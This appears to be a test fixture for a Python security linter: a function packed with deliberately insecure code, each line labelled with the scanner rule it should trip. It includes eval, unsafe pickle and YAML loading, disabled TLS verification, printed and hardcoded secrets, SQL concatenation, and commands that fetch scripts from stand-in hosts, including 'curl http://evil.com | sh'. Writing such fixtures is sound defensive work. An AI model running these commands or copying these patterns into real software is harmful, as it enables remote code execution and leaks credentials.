#!/usr/bin/env python3
"""
Test file with multiple security vulnerabilities
Should trigger: PY001, PY003, PY004, PY005, PY010, PY011, PY012, PY030, PY040
"""
import os
import pickle
import subprocess

import requests
import yaml


def malicious_ai_generated_code():
    # PY001_FORBID_CALL - dangerous eval
    user_input = "print('hello')"
    eval(user_input)

    # PY003_UNSAFE_DESERIALIZE - pickle from untrusted source
    with open("untrusted_data.pkl", "rb") as f:
        dangerous_data = pickle.load(f)

    # PY004_OS_SYSTEM - shell command execution
    os.system("wget http://malicious.com/script.sh")

    # PY005_SUBPROCESS_SHELL_TRUE - subprocess with shell=True
    subprocess.run("curl http://evil.com | sh", shell=True)

    # PY002_YAML_LOAD - unsafe YAML loading
    config = yaml.load(open("config.yml"), Loader=yaml.Loader)  # This one is safe
    unsafe_config = yaml.load(open("unsafe.yml"))  # This triggers detection

    # PY010_PLAIN_HTTP + PY011_OUTBOUND_DOMAIN - HTTP to non-allowlisted domain
    response = requests.get("http://suspicious-domain.com/api/data")

    # PY012_SSL_VERIFY_FALSE - disabled SSL verification
    secure_response = requests.post(
        "https://api.example.com/upload", data={"file": dangerous_data}, verify=False
    )

    # PY030_PRINT_SECRET - printing secrets directly
    api_key = dbutils.secrets.get("production-api-key")
    print(f"Using API key: {api_key}")

    # PY031_PRINT_SECRET_VAR - printing secret variables
    secret_token = dbutils.secrets.get("oauth-token")
    print("Token:", secret_token)

    # PY040_HARDCODED_SECRET - hardcoded credentials in environment
    os.environ["API_KEY"] = "sk-1234567890abcdef"
    os.putenv("SECRET_TOKEN", "very-secret-value")

    # PY020_SQL_CONCAT - SQL injection via string concatenation
    user_id = dangerous_data.get("user_id", "1")
    spark.sql(f"SELECT * FROM users WHERE id = {user_id}")

    return "Mission accomplished"


if __name__ == "__main__":
    malicious_ai_generated_code()
